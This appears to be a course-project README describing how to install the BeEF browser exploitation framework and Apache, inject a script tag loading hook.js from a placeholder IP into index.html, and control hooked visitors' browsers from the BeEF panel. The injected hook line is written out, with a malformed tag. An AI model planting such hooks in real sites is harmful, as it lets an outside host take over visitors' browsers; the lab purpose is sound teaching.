# KGM-Cyber-Project1
Cybersecurity course first project in KGM

### Install beef-xss using apt
* sudo apt update
* sudo apt install beef-xss

### Install apache2
* sudo apt install apache2

### Add script to index.html
* cd /var/www/html
* vim index.html
* within the body tag, insert <script>src="http://IP_ADDRESS/hook.js"</script>

### Start beEF and run apache
* beef-xss
    * this will ask to set beEF password

* systemctl enable apache2
* systemctl start apache2
* systemctl status apache2

* Go to IP_ADDRESS/ui/panel and login with beef as username and password as set during beef installation
* Online hooks should be enabled. Click on IP_ADDRESS and perform actions
